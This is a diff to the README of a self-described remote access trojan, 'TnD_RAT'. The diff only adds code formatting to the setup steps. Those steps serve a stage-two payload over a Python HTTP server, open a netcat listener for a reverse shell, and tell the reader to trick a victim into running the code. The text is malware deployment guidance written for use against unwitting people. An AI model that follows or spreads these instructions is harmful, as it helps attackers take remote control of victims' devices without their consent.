@@ -16,15 +16,15 @@ TnD_RAT is a basic Remote Access Trojan that I made from scratch. I've tested to
   ssh -i id_rsa <username>@IP_Address
 ```
 * After connecting to the server, start a python server in the folder containing stage2 payload.
-bash 
+```bash 
 python3 -m http.server
-
+```
 * Open another terminal.
 * SSH into the server again using this terminal by running the above ssh command.
 * Set up a listener by using the following command.
-bash 
+```bash 
 nc -nlvp <PORT NUMBER>
-
+```
 * Now, trick the victim into running our code on his device. (Make sure that the victim is connected to the internet.)
 
 * Woila!!!  You got a reverse shell into the victim's device.
